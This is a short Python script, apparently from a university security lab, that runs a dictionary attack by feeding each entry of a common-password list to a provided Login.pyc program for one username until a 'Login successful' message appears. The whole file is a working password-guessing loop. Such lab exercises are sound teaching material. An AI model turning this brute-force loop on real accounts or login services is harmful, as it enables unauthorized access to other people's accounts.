import subprocess
import time

# Start timer
start = time.time()
print("Start time: 0 seconds")

# File paths for Q1
most_common_pw_path = "/home/cse3140/Lab1/Q1/MostCommonPWs"  
login_script_path = "/home/cse3140/Lab1/Q1/Login.pyc"  
username = "SkyRedFalcon914"  


with open(most_common_pw_path, "r") as pw_file:
    for password in pw_file:
        password = password.strip()  
        print(f"Trying password: {password}")  
        
        
        result = subprocess.run(
            ["python3", login_script_path, username, password],
            capture_output=True, text=True
        )
        
        
        if "Login successful" in result.stdout:
            print(f"Password found: {password}")
            break
        else:
            print(f"Failed password: {password}")  


end = time.time() - start
print(f"End Time: {end:.2f} seconds")
